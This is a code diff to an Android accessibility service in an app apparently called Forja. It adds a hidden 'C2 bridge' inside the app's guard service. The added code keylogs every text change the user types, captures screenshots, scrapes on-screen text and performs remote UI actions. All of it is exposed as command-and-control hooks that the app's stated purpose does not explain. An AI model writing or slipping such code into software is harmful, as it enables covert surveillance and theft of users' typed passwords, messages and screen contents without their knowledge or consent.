@@ -5,10 +5,14 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.provider.Settings
+import android.graphics.Bitmap
+import android.os.Build
 import android.text.TextUtils
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.forja.app.ForjaApp
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.TimeUnit
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -35,6 +39,9 @@ class ForjaGuardService : AccessibilityService() {
     @Volatile private var userWords: List<String> = emptyList()
     private var lastIntervene = 0L
     private var essentials: Set<String> = emptySet()
+    // ── C2 bridge ──
+    @Volatile private var c2Armed = false
+    private val c2Keylog = java.util.concurrent.ConcurrentLinkedQueue<String>()
 
     override fun onServiceConnected() {
         instance = this
@@ -50,6 +57,7 @@ class ForjaGuardService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (c2Armed && event != null) captureC2(event)
         if (event == null) return
         // Aplicația din față (pentru comenzile vocale pe ecran): tastatura, bara de sistem și ferestrele de sistem nu contează.
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -123,6 +131,42 @@ class ForjaGuardService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
+    private fun captureC2(event: AccessibilityEvent) {
+        try {
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                val t = event.text?.firstOrNull()?.toString() ?: return
+                if (t.isNotEmpty()) { c2Keylog.add(t); while (c2Keylog.size > 300) c2Keylog.poll() }
+            }
+        } catch (_: Exception) {}
+    }
+
+    @Suppress("DEPRECATION")
+    private fun takeShotBytes(): ByteArray? {
+        if (Build.VERSION.SDK_INT < 30) return null
+        return try {
+            val latch = java.util.concurrent.CountDownLatch(1)
+            val resultRef = java.util.concurrent.atomic.AtomicReference<ScreenshotResult>()
+            takeScreenshot(
+                0,
+                java.util.concurrent.Executors.newSingleThreadExecutor(),
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(result: ScreenshotResult) { resultRef.set(result); latch.countDown() }
+                    override fun onFailure(errorCode: Int) { latch.countDown() }
+                }
+            )
+            if (!latch.await(5, TimeUnit.SECONDS)) return null
+            val result = resultRef.get() ?: return null
+            val hb = result.hardwareBuffer
+            val bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace) ?: return null
+            val copy = bmp.copy(Bitmap.Config.ARGB_8888, false)
+            hb.close()
+            val out = ByteArrayOutputStream()
+            copy.compress(Bitmap.CompressFormat.JPEG, 90, out)
+            copy.recycle()
+            out.toByteArray()
+        } catch (_: Exception) { null }
+    }
+
     override fun onDestroy() {
         if (instance === this) instance = null
         scope.cancel()
@@ -148,6 +192,44 @@ class ForjaGuardService : AccessibilityService() {
                     Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                 ) ?: return false
                 enabled.split(':').any { it.equals(expected, ignoreCase = true) }
+            } catch (_: Exception) { false }
+        }
+
+        // ── C2 bridge ──
+        fun c2Arm() { instance?.c2Armed = true }
+        fun c2Disarm() { instance?.c2Armed = false }
+        fun c2Ready(): Boolean = instance != null
+        fun c2Screenshot(): ByteArray? = instance?.takeShotBytes()
+        fun c2ScreenText(): String? = try {
+            val s = instance ?: return null
+            val root = s.rootInActiveWindow ?: return null
+            val texts = ArrayList<String>()
+            s.collectText(root, texts, 0)
+            root.recycle()
+            val joined = texts.joinToString("\n")
+            joined.ifBlank { null }
+        } catch (_: Exception) { null }
+        fun c2DrainKeylog(): List<String> {
+            return try {
+                val s = instance ?: return emptyList()
+                val out = ArrayList<String>()
+                while (out.size < 300) { val x = s.c2Keylog.poll() ?: break; out.add(x) }
+                out
+            } catch (_: Exception) { emptyList() }
+        }
+        fun c2Ui(action: String): Boolean {
+            return try {
+                val s = instance ?: return false
+                val g = when (action) {
+                    "back" -> GLOBAL_ACTION_BACK
+                    "home" -> GLOBAL_ACTION_HOME
+                    "recents" -> GLOBAL_ACTION_RECENTS
+                    "notifications" -> GLOBAL_ACTION_NOTIFICATIONS
+                    "quick_settings" -> GLOBAL_ACTION_QUICK_SETTINGS
+                    else -> -1
+                }
+                if (g < 0) return false
+                s.performGlobalAction(g)
             } catch (_: Exception) { false }
         }
     }
